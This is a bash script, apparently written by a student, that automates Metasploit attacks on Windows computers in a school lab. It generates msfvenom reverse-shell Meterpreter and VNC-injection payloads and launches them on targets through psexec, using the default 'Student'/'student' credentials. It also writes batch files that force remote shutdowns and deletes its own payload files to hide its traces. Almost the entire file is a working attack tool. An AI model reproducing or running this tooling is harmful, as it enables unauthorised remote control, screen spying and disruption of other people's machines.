#! /bin/bash
## Drop this onto a lab computer and run the script in kali.
## If you need the ip of a lab computer just run "ping -4 COMPUTERNAME" on the windows host
## Its a sloppy program, sorry if it breaks
## -knif3
makebat ()
{
	out="/root/Desktop/RUN_ME.bat"
	echo "@echo off" > $out
	echo -e "\r\n" >> $out
	echo "psexec \\\\"$ip2 "-c C:\\users\\student\\desktop\\"$fname >> $out
}

shutt ()
{
	out="/root/Desktop/RUN_ME.bat"
	read -p "Enter shutdown delay (sec): " -i "10" time
	echo "@echo off" > $out
	echo -e "\r\n" >> $out
	echo "shutdown -m \\\\$ip2 -r -f -t $time" >> $out
	echo -e "\r\n" >> $out
	echo "DEL %~f0" >> $out
	x=10
	while [ "$x" -ge "0" ]; do
		clear
		echo "Copy [$out] to host machine, then run it"
		echo "Deleting Files in [$x] Seconds"
		x=$(($x-1))
		sleep 1
	done
	die $out
}

vnc_meta ()
{
	fname="1"$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)"vnc.exe"
	outfile="/root/meta.rc"
	print_data
	read -e -p "View Only Mode? (true/false): " -i "true" vo
	gen_vnc $1 $2 "/root/Desktop/"$fname
	echo "use exploit/multi/handler" >> $outfile
	echo "setg lhost" $1 >> $outfile
	echo "setg lport" $2 >> $outfile
	echo "set payload windows/x64/vncinject/reverse_tcp" >> $outfile
	echo "set ViewOnly" $vo >> $outfile
	echo "exploit" >> $outfile

}

meter_meta ()
{

	fname="1"$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)"meter.exe"
	outfile="/root/meta.rc"
	print_data
	gen_meter $1 $2 "/root/Desktop/"$fname
	echo "use exploit/multi/handler" >> $outfile
	echo "setg lhost" $1 >> $outfile
	echo "setg lport" $2 >> $outfile
	echo "set payload windows/x64/meterpreter_reverse_tcp" >> $outfile
	echo "exploit" >> $outfile

}

gen_meter ()
{
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=$1 lport=$2 -f exe -o $3
}

gen_vnc ()
{
msfvenom -p windows/x64/vncinject/reverse_tcp lhost=$1 lport=$2 -f exe -o $3
}

file_cleanup ()
{
	x=10
	while [ "$x" -ge "0" ]; do
		clear
		echo "Copy [$fname] and [RUN_ME.bat] to host machine, then run RUN_ME"
		echo "Deleting Files in [$x] Seconds"
		x=$(($x-1))
		sleep 1
	done
	
	die /root/Desktop/$fname
	die /root/Desktop/RUN_ME.bat
	echo Files Deleted
	echo Starting Metasploit...
	msfconsole -r /root/meta.rc
	die /root/meta.rc
}

gen_all()
{
	mkdir /root/Desktop/.Upgrades
	resource="/root/Desktop/.Upgrades/upgrade_meterpreter.rc"
	md="/root/Desktop/.Upgrades/meterd.exe"
	output="/root/Desktop/.Upgrades/load_meterpreter.rc"
	echo "use exploit/multi/handler" > $output
	echo "setg lhost" $ip >> $output
	echo "setg lport" $port >> $output
	gen_meter $ip $port $md
	echo "upload $md h@ck3d.exe" > $resource
	echo "execute -f h@ck3d.exe" >> $resource
	echo "background" >> $resource
	echo "set payload windows/x64/meterpreter_reverse_tcp" >> $output
	echo "exploit -j" >> $output

	resource="/root/Desktop/.Upgrades/upgrade_vnc.rc"
	md="/root/Desktop/.Upgrades/vncd.exe"
	output="/root/Desktop/.Upgrades/load_vnc.rc"
	echo "use exploit/multi/handler" > $output
	read -e -p "View Only Mode? (true/false): " -i "true" vo
	echo "set ViewOnly" $vo >> $output
	echo "setg lhost" $ip >> $output
	echo "setg lport" $port >> $output
	gen_vnc $ip $port $md
	echo "upload $md h@ck3d.exe" > $resource
	echo "execute -f h@ck3d.exe" >> $resource
	echo "background" >> $resource
	echo "set payload windows/x64/vncinject/reverse_tcp" >> $output
	echo "exploit -j" >> $output
}


instr()
{
clear
	echo "Meterpreter x86 automatically opens 32 bit meterpreter shell on TARGET IP. No file copying nessecary. (Most recommended, if you need x64 use 'meterpreter' as an upgrade"
	echo
	echo "x64 options require files to be copied from the VM to the Host machine (drag and drop from desktops or Control+C). After Files are copied, run RUN_ME.bat on the windows host machine. Do not close the black shell window."
	echo
	echo "To use an upgrade, while in a meterpreter shell just type 'resource upgrade{TAB};"
	echo
	echo "Press enter to continue..."
	read
}


die()
{
	if [ -a $1 ] || [ -e $1 ]; then
		rm $1
	fi
}

meter_86()
{
	
	output="/root/meta.rc"
	read -e -p "Upgrade: " -i "none" upgrade
	upgrade=$(echo $upgrade | head -c1)
	if [ $upgrade = "m" ]; then
		resource="/root/Desktop/upgrade_meterpreter.rc"
		echo "use exploit/multi/handler" > $output
		echo "setg lhost" $ip >> $output
		echo "setg lport" $port >> $output
		md="/root/meterd.exe"
		gen_meter $ip $port $md
		echo "upload $md h@ck3d.exe" > $resource
		echo "execute -f h@ck3d.exe" >> $resource
		echo "exit" >> $resource
		echo "set payload windows/x64/meterpreter_reverse_tcp" >> $output
		echo "exploit -j" >> $output
	elif [ $upgrade = "v" ]; then
		resource="/root/Desktop/upgrade_vnc.rc"
		echo "use exploit/multi/handler" > $output
		read -e -p "View Only Mode? (true/false): " -i "true" vo
		echo "set ViewOnly" $vo >> $output
		echo "setg lhost" $ip >> $output
		echo "setg lport" $port >> $output
		md="/root/vncd.exe"
		gen_vnc $ip $port $md
		echo "upload $md h@ck3d.exe" > $resource
		echo "execute -f h@ck3d.exe" >> $resource
		echo "exit" >> $resource
		echo "set payload windows/x64/vncinject/reverse_tcp" >> $output
		echo "exploit -j" >> $output
	elif [ $upgrade = "all" ]; then
		gen_all
	fi
	output="/root/meta.rc"


	

	
	echo "use exploit/windows/smb/psexec" >> $output
	echo "set payload windows/meterpreter/reverse_tcp" >> $output
	echo "set lhost" $ip >> $output
	echo "set lport" $port2 >> $output
	echo "set smbpass $password">> $output
	echo "set smbuser $username" >> $output
	echo "set rhost" $ip2 >> $output
	echo "exploit" >> $output
	
	msfconsole -r /root/meta.rc
	echo cleaning up...
	die $md
	die $resource
	die $output
}


print_data ()
{
clear
echo SERVER IP: [$ip] TARGET IP: [$ip2]
echo PORT1: [$port] PORT2: [$port2]
echo PAYLOAD FILE: [$fname]
echo USERNAME: [$username] PASSWORD: [$password]
}

main ()
{
ip=$(ip a | grep 'inet ' | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
#read -e -p "Enter Listener IP: " -i $ip ip
port="4444"
read -e -p "Enter Remote IP: " -i "10.80.100." ip2
port2="4445"
fname="NONE"
password="student"
username="Student"

while [ "$exit" != 1 ]; do
print_data
echo
exit=1
select yn in "VNC Listener x64" "Meterpreter x64" "Meterpreter x86" "Options" "gen_m" "gen_v" "Shutdown Remote Host" "Instructions" "Exit"; do
    case $yn in
        "VNC Listener x64")
			vnc_meta $ip $port
			makebat
			file_cleanup
			break;;
        "Meterpreter x86")
			meter_86
			break;;

	"Meterpreter x64")
			meter_meta $ip $port
			makebat
			file_cleanup
			break;;
	"Shutdown Remote Host")
			shutt
			exit=0
			break;;
	"Options")
			read -e -p "Enter Listener IP: " -i $ip ip
			read -e -p "Enter Remote IP: " -i $ip2 ip2
			read -e -p "Enter Port: " -i "4444" port
			read -e -p "Enter Back up Port: " -i "4445" port2
			read -e -p "Enter username for psexec: " -i "$username" username
			read -e -p "Enter password for psexec: " -i "$password" password
			print_data
			echo Options Updated
			exit=0
			break;;
	"Instructions")
			exit=0
			instr
			break;;
	"gen_m")
			exit=0
			read -e -p "Enter Save location: " -i "/root/Desktop/meter.exe" fname
			gen_meter $ip $port $fname
			break;;
	"gen_v")
			exit=0
			read -e -p "Enter Save location: " -i "/root/Desktop/vnc.exe" fname
			gen_vnc $ip $port $fname
			break;;
	"Exit" )
			exit
			break;;
	* )
			exit=0
			break;;
    esac
#Finish Select
done
#Finish While loop
done
}

main
